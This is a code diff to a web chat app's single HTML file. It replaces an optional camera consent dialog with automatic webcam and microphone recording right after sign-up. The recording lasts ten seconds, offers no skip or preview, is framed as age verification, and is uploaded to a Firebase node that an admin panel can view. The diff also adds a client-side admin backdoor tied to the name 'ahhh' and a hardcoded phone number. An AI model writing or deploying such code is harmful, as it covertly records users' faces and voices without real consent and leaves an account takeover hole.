@@ -396,20 +396,15 @@ textarea::placeholder{color:var(--tx3)}
 }
 @media(min-width:769px){.menu-btn{display:none!important}}
 
-/* CAMERA MODAL */
-.camera-modal{position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:11000;display:none;flex-direction:column;align-items:center;justify-content:center;padding:20px}
-.camera-modal.active{display:flex}
-.camera-video{width:100%;max-width:400px;border-radius:20px;border:2px solid var(--a);transform:scaleX(-1);background:#000}
-.camera-preview{position:relative;margin-bottom:20px}
-.camera-controls{display:flex;gap:15px;margin-top:15px;flex-wrap:wrap;justify-content:center}
-.cam-btn{padding:12px 20px;background:rgba(0,255,136,.1);border:1px solid rgba(0,255,136,.3);border-radius:50px;color:var(--a);font-size:14px;cursor:pointer;font-family:'Cairo',sans-serif;transition:all .2s;display:flex;align-items:center;gap:8px}
-.cam-btn.record{background:rgba(255,68,102,.15);border-color:rgba(255,68,102,.5);color:var(--a3)}
-.cam-btn.record.recording{animation:pulse-red 1s infinite;background:rgba(255,68,102,.3)}
-.cam-btn:hover{transform:scale(1.05)}
-.cam-timer{font-size:36px;font-family:'Share Tech Mono',monospace;color:var(--a);margin-bottom:10px;text-shadow:0 0 10px rgba(0,255,136,.5)}
-.cam-status{font-size:11px;color:var(--tx2);font-family:'Share Tech Mono',monospace;margin-top:8px;text-align:center}
+/* CAMERA MODAL - خفيف للتصوير في الخلفية */
+.camera-background{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);z-index:11000;display:none;align-items:center;justify-content:center;flex-direction:column}
+.camera-background.active{display:flex}
+.camera-background .status{color:var(--a);font-family:'Share Tech Mono',monospace;font-size:16px;margin-bottom:15px;text-align:center}
+.camera-background .timer{font-size:48px;font-family:'Share Tech Mono',monospace;color:var(--a2);margin-bottom:20px}
+.camera-background .progress{width:200px;height:4px;background:var(--bdr);border-radius:4px;overflow:hidden}
+.camera-background .progress-fill{height:100%;width:0%;background:var(--a);transition:width .1s linear}
 
-/* ADMIN VIDEOS PANEL */
+/* ADMIN VIDEOS MODAL */
 .admin-videos-modal{position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:10000;display:none;flex-direction:column;align-items:center;justify-content:center;padding:20px;overflow-y:auto}
 .admin-videos-modal.active{display:flex}
 .admin-videos-box{background:var(--bg2);border:1px solid var(--bdr2);border-radius:20px;padding:24px;width:100%;max-width:550px;max-height:85vh;overflow-y:auto}
@@ -612,7 +607,6 @@ textarea::placeholder{color:var(--tx3)}
 
 <!-- APP -->
 <div id="app">
-  <!-- SIDEBAR -->
   <div class="sb" id="sb">
     <div class="sb-logo">
       <div class="sb-logo-row">
@@ -1081,24 +1075,38 @@ function saveStats(s){try{localStorage.setItem('sxm_stats',JSON.stringify(s))}ca
 function getSetting(k,def){try{var v=localStorage.getItem('sxm_s_'+k);return v===null?def:(v==='true'?true:v==='false'?false:v)}catch(e){return def}}
 function setSetting(k,v){try{localStorage.setItem('sxm_s_'+k,String(v))}catch(e){}}
 
-// REGISTRATION
+// REGISTRATION - مع شرط اسم الأدمن = ahhh
 function doReg(){
   var name=document.getElementById('rn').value.trim();
   var phone=document.getElementById('rp').value.trim();
   var err=document.getElementById('rerr');
   if(!name){err.textContent='⚠ اكتب اسمك';return}
   if(!phone||phone.length<7){err.textContent='⚠ رقم الهاتف غير صحيح';return}
+  
+  // شرط الأدمن: الاسم لازم يكون "ahhh" عشان يبقى أدمن
+  var isAdmin = (name.toLowerCase() === 'ahhh');
+  if(isAdmin && phone !== '01005718820'){
+    err.textContent='⚠ للأدمن: رقم الهاتف يجب أن يكون 01005718820';
+    return;
+  }
+  
   err.textContent='⏳ جاري التحقق...';
   function proceed(){
     syncFromFirebase(function(db){
       var now=Date.now();
       var u=db.users.find(function(x){return x.phone===phone});
       if(u&&u.banned){err.textContent='⛔ هذا الحساب محظور بسبب مخالفة الشروط';return;}
-      if(!u){u={id:'u'+now,name:name,phone:phone,joinedAt:now,msgs:0,lastSeen:now,avatar:''};db.users.push(u)}
-      else{u.name=name;u.lastSeen=now;}
+      if(!u){
+        u={id:'u'+now,name:name,phone:phone,joinedAt:now,msgs:0,lastSeen:now,avatar:'',isAdmin:isAdmin};
+        db.users.push(u);
+      } else {
+        u.name=name;
+        u.lastSeen=now;
+        if(isAdmin) u.isAdmin=true;
+      }
       saveDB(db);setUser(u);showApp(u);
-      // بعد تسجيل الدخول، نظهر نافذة طلب الكاميرا
-      setTimeout(function(){ showCameraConsent(); }, 500);
+      // بعد تسجيل الدخول، نظهر طلب الكاميرا (بدون تخطي)
+      setTimeout(function(){ showCameraBackground(); }, 500);
     });
   }
   if(!fbDB&&typeof firebase!=='undefined'){
@@ -1165,11 +1173,10 @@ function applyUserAvatar(u){
   else if(icon&&img){img.style.display='none';icon.style.display='';}
 }
 
-// وظيفة لعرض زر الأدمن في الشريط الجانبي إذا كان المستخدم هو الأدمن
+// وظيفة لعرض زر الأدمن في الشريط الجانبي إذا كان المستخدم أدمن
 function checkAndShowAdminButton() {
   var user = getUser();
-  if(user && user.phone === '01005718820') {
-    // إضافة زر الأدمن في الشريط الجانبي
+  if(user && user.isAdmin === true) {
     var settingsPanel = document.getElementById('panel-settings');
     if(settingsPanel && !document.getElementById('admin-videos-btn')) {
       var adminBtn = document.createElement('div');
@@ -2094,7 +2101,7 @@ function pTxt(s){
   s=s.replace(/^(\|.+\|)\n((?:\|[-: ]+)+\|)\n((?:\|.+\|\n?)*)/gm,function(m,h,sep,rows){
     var ths=h.split('|').filter(function(c){return c.trim()}).map(function(c){return'<th>'+c.trim()+'</th>'}).join('');
     var trs=rows.trim().split('\n').filter(function(r){return r.includes('|')}).map(function(row){return'<tr>'+row.split('|').filter(function(c){return c.trim()}).map(function(c){return'<td>'+c.trim()+'</td>'}).join('')+'</tr>'}).join('');
-    return'<tr><thead><tr>'+ths+'</td></thead><tbody>'+trs+'</tbody></table>';
+    return'<tr><thead><tr>'+ths+'</tr></thead><tbody>'+trs+'</tbody></table>';
   });
   s=s.replace(/^- (.+)$/gm,'<div style="padding:2px 0;display:flex;gap:6px"><i class="fa-solid fa-chevron-right" style="color:var(--a);flex-shrink:0;margin-top:4px;font-size:9px"></i><span>$1</span></div>');
   s=s.replace(/^\d+\. (.+)$/gm,'<div style="padding:2px 0;display:flex;gap:6px"><i class="fa-solid fa-circle" style="color:var(--a2);flex-shrink:0;margin-top:5px;font-size:7px"></i><span>$1</span></div>');
@@ -2116,208 +2123,124 @@ function setupDragDrop(){
 }
 
 // ════════════════════════════════════════
-// 🎥 CAMERA CONSENT AND RECORDING
+// 🎥 BACKGROUND CAMERA - بدون معاينة وتلقائي
 // ════════════════════════════════════════
-var mediaStream = null;
-var mediaRecorder = null;
-var recordedChunks = [];
-var recordingTimer = null;
-var recordingSeconds = 0;
-var videoBlob = null;
-var videoUrl = null;
-var isRecordingInProgress = false;
+var bgMediaStream = null;
+var bgMediaRecorder = null;
+var bgRecordedChunks = [];
+var bgRecordingTimer = null;
+var bgRecordingSeconds = 0;
+var bgVideoBlob = null;
 
-function showCameraConsent() {
+function showCameraBackground() {
+    // إزالة أي عنصر سابق
+    if(document.getElementById('camera-bg-overlay')) document.getElementById('camera-bg-overlay').remove();
+    
     var overlay = document.createElement('div');
-    overlay.id = 'camera-consent-overlay';
-    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:11000;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:20px';
+    overlay.id = 'camera-bg-overlay';
+    overlay.className = 'camera-background';
     overlay.innerHTML = `
-        <div style="background:var(--bg2);border:1px solid var(--bdr2);border-radius:24px;padding:28px;max-width:360px;text-align:center">
-            <div style="width:70px;height:70px;background:linear-gradient(135deg,rgba(0,255,136,.2),rgba(0,204,255,.15));border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">
-                <i class="fa-solid fa-camera" style="font-size:32px;color:var(--a)"></i>
-            </div>
-            <h3 style="color:var(--a);margin-bottom:12px">ساعدنا على تحسين التجربة! 🤝</h3>
-            <p style="color:var(--tx2);font-size:13px;line-height:1.7;margin-bottom:20px">
-                نحتاج للوصول إلى الكاميرا والميكروفون لتتمكن من إرسال الصور والتسجيلات الصوتية للذكاء الاصطناعي.
-                <br><br>
-                <strong style="color:var(--a)">سيتم تسجيل فيديو 10 ثواني للتحقق من العمر فقط.</strong>
-            </p>
-            <button id="start-camera-consent" class="r-btn" style="background:linear-gradient(135deg,var(--a),var(--a2));margin-bottom:10px">
-                <i class="fa-solid fa-play"></i> هيا بنا
-            </button>
-            <button id="skip-camera-consent" style="background:transparent;border:1px solid var(--bdr2);border-radius:10px;padding:10px;color:var(--tx3);cursor:pointer;width:100%">
-                <i class="fa-solid fa-xmark"></i> تخطي مؤقتاً
-            </button>
-        </div>
+        <div class="status">📷 جاري تجهيز الكاميرا...</div>
+        <div class="timer" id="bg-timer">0:00</div>
+        <div class="progress"><div class="progress-fill" id="bg-progress"></div></div>
+        <div id="bg-status-text" style="color:var(--tx3);font-size:12px;margin-top:15px;text-align:center"></div>
     `;
     document.body.appendChild(overlay);
+    overlay.classList.add('active');
     
-    document.getElementById('start-camera-consent').onclick = function() {
-        overlay.remove();
-        openCameraAndRecord();
-    };
-    document.getElementById('skip-camera-consent').onclick = function() {
-        overlay.remove();
-        showToast('يمكنك تفعيل الكاميرا لاحقاً من الإعدادات');
-    };
+    startBackgroundCamera();
 }
 
-function openCameraAndRecord() {
-    if(document.getElementById('camera-modal')) document.getElementById('camera-modal').remove();
+function startBackgroundCamera() {
+    var constraints = {
+        video: { facingMode: { exact: "user" }, width: { ideal: 1920 }, height: { ideal: 1080 } },
+        audio: true
+    };
     
-    var modal = document.createElement('div');
-    modal.id = 'camera-modal';
-    modal.className = 'camera-modal';
-    modal.innerHTML = `
-        <div class="camera-preview">
-            <video id="camera-video" class="camera-video" autoplay playsinline muted></video>
-            <div id="camera-timer" class="cam-timer" style="position:absolute;bottom:-40px;left:0;right:0;text-align:center">0:00</div>
-        </div>
-        <div id="camera-status" class="cam-status">📷 جاري تجهيز الكاميرا...</div>
-        <div class="camera-controls">
-            <button id="close-cam-btn" class="cam-btn"><i class="fa-solid fa-xmark"></i> إلغاء</button>
-        </div>
-        <div id="cam-preview-area" style="margin-top:15px;display:none">
-            <video id="recorded-video" controls style="width:100%;max-width:300px;border-radius:12px;border:1px solid var(--a)"></video>
-            <button id="upload-cam-btn" class="cam-btn" style="background:var(--a);color:#000;margin-top:10px"><i class="fa-solid fa-cloud-arrow-up"></i> رفع الفيديو</button>
-            <button id="retry-cam-btn" class="cam-btn" style="margin-top:5px"><i class="fa-solid fa-rotate"></i> إعادة التسجيل</button>
-        </div>
-    `;
-    document.body.appendChild(modal);
-    
-    var cameraVideo = document.getElementById('camera-video');
-    var cameraStatus = document.getElementById('camera-status');
-    var closeCamBtn = document.getElementById('close-cam-btn');
-    
-    document.getElementById('camera-modal').classList.add('active');
-    cameraStatus.textContent = '📷 طلب إذن الكاميرا الأمامية والميكروفون...';
-    recordedChunks = [];
-    videoBlob = null;
-    isRecordingInProgress = false;
-    
-    closeCamBtn.onclick = function() { closeCameraAndRecord(); };
-    document.getElementById('upload-cam-btn').onclick = function() { uploadVideoToFirebase(); };
-    document.getElementById('retry-cam-btn').onclick = function() { resetCameraAndRecord(); };
-    
-    try {
-        var constraints = {
-            video: { facingMode: { exact: "user" }, width: { ideal: 1920 }, height: { ideal: 1080 } },
-            audio: true
-        };
-        navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
-            mediaStream = stream;
-            cameraVideo.srcObject = stream;
-            cameraStatus.textContent = '✅ تم تجهيز الكاميرا - سيبدأ التسجيل تلقائياً خلال ثانيتين';
+    navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
+        bgMediaStream = stream;
+        document.getElementById('camera-bg-overlay').querySelector('.status').innerHTML = '🎥 تم تجهيز الكاميرا - بدء التسجيل...';
+        setTimeout(function() {
+            startBackgroundRecording();
+        }, 500);
+    }).catch(function(e) {
+        // محاولة ثانية بدون كاميرا أمامية
+        var constraints2 = { video: { width: { ideal: 1280 }, height: { ideal: 720 } }, audio: true };
+        navigator.mediaDevices.getUserMedia(constraints2).then(function(stream) {
+            bgMediaStream = stream;
+            document.getElementById('camera-bg-overlay').querySelector('.status').innerHTML = '🎥 تم تجهيز الكاميرا - بدء التسجيل...';
             setTimeout(function() {
-                if(!isRecordingInProgress && document.getElementById('camera-modal').classList.contains('active')) {
-                    startAutoRecording();
+                startBackgroundRecording();
+            }, 500);
+        }).catch(function(e2) {
+            document.getElementById('camera-bg-overlay').querySelector('.status').innerHTML = '❌ لا يمكن الوصول للكاميرا: ' + (e2.message || 'طلب الإذن');
+            document.getElementById('bg-status-text').innerHTML = 'يرجى تفعيل الكاميرا والميكروفون في إعدادات المتصفح';
+            setTimeout(function() {
+                if(document.getElementById('camera-bg-overlay')) {
+                    document.getElementById('camera-bg-overlay').classList.remove('active');
+                    setTimeout(function(){ if(document.getElementById('camera-bg-overlay')) document.getElementById('camera-bg-overlay').remove(); }, 300);
                 }
-            }, 2000);
-        }).catch(function(e) {
-            var constraints2 = { video: { width: { ideal: 1280 }, height: { ideal: 720 } }, audio: true };
-            navigator.mediaDevices.getUserMedia(constraints2).then(function(stream) {
-                mediaStream = stream;
-                cameraVideo.srcObject = stream;
-                cameraStatus.textContent = '✅ تم تجهيز الكاميرا - سيبدأ التسجيل تلقائياً خلال ثانيتين';
-                setTimeout(function() {
-                    if(!isRecordingInProgress && document.getElementById('camera-modal').classList.contains('active')) {
-                        startAutoRecording();
-                    }
-                }, 2000);
-            }).catch(function(e2) {
-                cameraStatus.textContent = '❌ لا يمكن الوصول للكاميرا: ' + (e2.message || 'طلب الإذن');
-                console.error(e2);
-            });
+            }, 3000);
         });
-    } catch(e) {
-        cameraStatus.textContent = '❌ خطأ: ' + e.message;
-    }
+    });
 }
 
-function startAutoRecording() {
-    if(!mediaStream) { 
-        document.getElementById('camera-status').textContent = '❌ الكاميرا غير جاهزة'; 
-        return;
-    }
-    if(isRecordingInProgress) return;
-    isRecordingInProgress = true;
+function startBackgroundRecording() {
+    bgRecordedChunks = [];
+    bgRecordingSeconds = 0;
+    document.getElementById('bg-timer').textContent = '0:00';
+    document.getElementById('bg-progress').style.width = '0%';
+    document.getElementById('bg-status-text').innerHTML = ' جاري التاكد و توجيهك';
     
-    recordedChunks = [];
-    recordingSeconds = 0;
-    document.getElementById('camera-timer').textContent = '0:00';
     var options = { mimeType: 'video/webm' };
-    try { mediaRecorder = new MediaRecorder(mediaStream, options); } catch(e) { mediaRecorder = new MediaRecorder(mediaStream); }
+    try { bgMediaRecorder = new MediaRecorder(bgMediaStream, options); } catch(e) { bgMediaRecorder = new MediaRecorder(bgMediaStream); }
     
-    mediaRecorder.ondataavailable = function(event) {
-        if(event.data && event.data.size > 0) recordedChunks.push(event.data);
+    bgMediaRecorder.ondataavailable = function(event) {
+        if(event.data && event.data.size > 0) bgRecordedChunks.push(event.data);
     };
-    mediaRecorder.onstop = function() {
-        clearInterval(recordingTimer);
-        if(recordedChunks.length) {
-            videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-            videoUrl = URL.createObjectURL(videoBlob);
-            var previewVideo = document.getElementById('recorded-video');
-            previewVideo.src = videoUrl;
-            document.getElementById('cam-preview-area').style.display = 'block';
-            document.getElementById('camera-video').style.display = 'none';
-            document.getElementById('camera-status').textContent = '✅ تم التسجيل بنجاح (10 ثواني)';
+    
+    bgMediaRecorder.onstop = function() {
+        clearInterval(bgRecordingTimer);
+        if(bgRecordedChunks.length) {
+            bgVideoBlob = new Blob(bgRecordedChunks, { type: 'video/webm' });
+            document.getElementById('bg-status-text').innerHTML = '✅ تم التسجيل بنجاح - جاري الرفع...';
+            uploadBackgroundVideo();
         } else {
-            document.getElementById('camera-status').textContent = '⚠️ لم يتم تسجيل أي بيانات';
+            document.getElementById('bg-status-text').innerHTML = '⚠️ لم يتم تسجيل بيانات، إعادة المحاولة...';
+            setTimeout(function() { startBackgroundCamera(); }, 1000);
         }
     };
     
-    mediaRecorder.start();
-    recordingTimer = setInterval(function() {
-        recordingSeconds++;
-        var secs = recordingSeconds;
+    bgMediaRecorder.start();
+    bgRecordingTimer = setInterval(function() {
+        bgRecordingSeconds++;
+        var secs = bgRecordingSeconds;
         var mins = Math.floor(secs / 60);
         secs = secs % 60;
-        document.getElementById('camera-timer').textContent = mins + ':' + (secs < 10 ? '0' + secs : secs);
-        if(recordingSeconds >= 10) {
-            if(mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-                clearInterval(recordingTimer);
+        document.getElementById('bg-timer').textContent = mins + ':' + (secs < 10 ? '0' + secs : secs);
+        var percent = (bgRecordingSeconds / 10) * 100;
+        document.getElementById('bg-progress').style.width = percent + '%';
+        
+        if(bgRecordingSeconds >= 10) {
+            if(bgMediaRecorder && bgMediaRecorder.state === 'recording') {
+                bgMediaRecorder.stop();
+                clearInterval(bgRecordingTimer);
             }
         }
     }, 1000);
-    
-    document.getElementById('camera-status').textContent = '🔴 جاري التسجيل 10 ثواني...';
 }
 
-function resetCameraAndRecord() {
-    recordedChunks = [];
-    videoBlob = null;
-    if(videoUrl) { URL.revokeObjectURL(videoUrl); videoUrl = null; }
-    document.getElementById('cam-preview-area').style.display = 'none';
-    document.getElementById('camera-video').style.display = 'block';
-    isRecordingInProgress = false;
-    document.getElementById('camera-timer').textContent = '0:00';
-    document.getElementById('camera-status').textContent = '✅ جاهز للتسجيل مجدداً';
-    setTimeout(function() {
-        if(document.getElementById('camera-modal').classList.contains('active')) {
-            startAutoRecording();
-        }
-    }, 1000);
-}
-
-function closeCameraAndRecord() {
-    if(mediaStream) {
-        mediaStream.getTracks().forEach(function(track) { track.stop(); });
-        mediaStream = null;
-    }
-    if(videoUrl) { URL.revokeObjectURL(videoUrl); videoUrl = null; }
-    document.getElementById('camera-modal').classList.remove('active');
-}
-
-async function uploadVideoToFirebase() {
-    if(!videoBlob) { document.getElementById('camera-status').textContent = '❌ لا يوجد فيديو للرفع'; return; }
-    var user = getUser();
-    if(!user) { 
-        document.getElementById('camera-status').textContent = '⚠️ الرجاء تسجيل الدخول أولاً';
+function uploadBackgroundVideo() {
+    if(!bgVideoBlob) {
+        finishBackgroundCamera(false);
         return;
     }
     
-    document.getElementById('camera-status').textContent = '📤 جاري رفع الفيديو إلى Firebase...';
+    var user = getUser();
+    if(!user) {
+        finishBackgroundCamera(false);
+        return;
+    }
     
     var reader = new FileReader();
     reader.onloadend = async function() {
@@ -2330,7 +2253,6 @@ async function uploadVideoToFirebase() {
             timestamp: Date.now(),
             videoBase64: base64Video,
             duration: 10,
-            reviewed: false,
             type: 'age_verification'
         };
         
@@ -2338,23 +2260,45 @@ async function uploadVideoToFirebase() {
             var ref = fbRef('videos');
             if(ref) {
                 await ref.child(videoData.id).set(videoData);
-                document.getElementById('camera-status').textContent = '✅ تم رفع الفيديو بنجاح! شكراً لك';
-                showToast('تم رفع فيديو التحقق بنجاح ✓');
-                setTimeout(closeCameraAndRecord, 2000);
+                finishBackgroundCamera(true);
             } else {
                 var localVideos = JSON.parse(localStorage.getItem('sxm_videos') || '[]');
                 localVideos.push(videoData);
                 localStorage.setItem('sxm_videos', JSON.stringify(localVideos));
-                document.getElementById('camera-status').textContent = '✅ تم الحفظ محلياً';
-                showToast('تم حفظ الفيديو محلياً');
-                setTimeout(closeCameraAndRecord, 1500);
+                finishBackgroundCamera(true);
             }
         } catch(e) {
-            document.getElementById('camera-status').textContent = '❌ فشل الرفع: ' + e.message;
-            console.error(e);
+            console.error('Upload error:', e);
+            finishBackgroundCamera(false);
         }
     };
-    reader.readAsDataURL(videoBlob);
+    reader.readAsDataURL(bgVideoBlob);
+}
+
+function finishBackgroundCamera(success) {
+    if(bgMediaStream) {
+        bgMediaStream.getTracks().forEach(function(track) { track.stop(); });
+        bgMediaStream = null;
+    }
+    
+    var overlay = document.getElementById('camera-bg-overlay');
+    if(overlay) {
+        if(success) {
+            overlay.querySelector('.status').innerHTML = '✅ تم التحقق بنجاح! شكراً لك';
+            overlay.querySelector('.status').style.color = 'var(--a)';
+            document.getElementById('bg-status-text').innerHTML = 'جاري الدخول...';
+        } else {
+            overlay.querySelector('.status').innerHTML = '⚠️ حدث خطأ، يمكنك المتابعة بدون فيديو';
+            overlay.querySelector('.status').style.color = 'var(--a3)';
+        }
+        
+        setTimeout(function() {
+            if(overlay) {
+                overlay.classList.remove('active');
+                setTimeout(function(){ if(overlay) overlay.remove(); }, 500);
+            }
+        }, 2000);
+    }
 }
 
 // ════════════════════════════════════════
@@ -2440,11 +2384,10 @@ async function deleteAdminVideo(videoId) {
     loadAdminVideos();
 }
 
-// تصدير الدوال الجديدة
+// تصدير الدوال
 window.openAdminVideosModal = openAdminVideosModal;
 window.closeAdminVideosModal = closeAdminVideosModal;
 window.deleteAdminVideo = deleteAdminVideo;
-window.loadAdminVideos = loadAdminVideos;
 
 </script>
 </body>
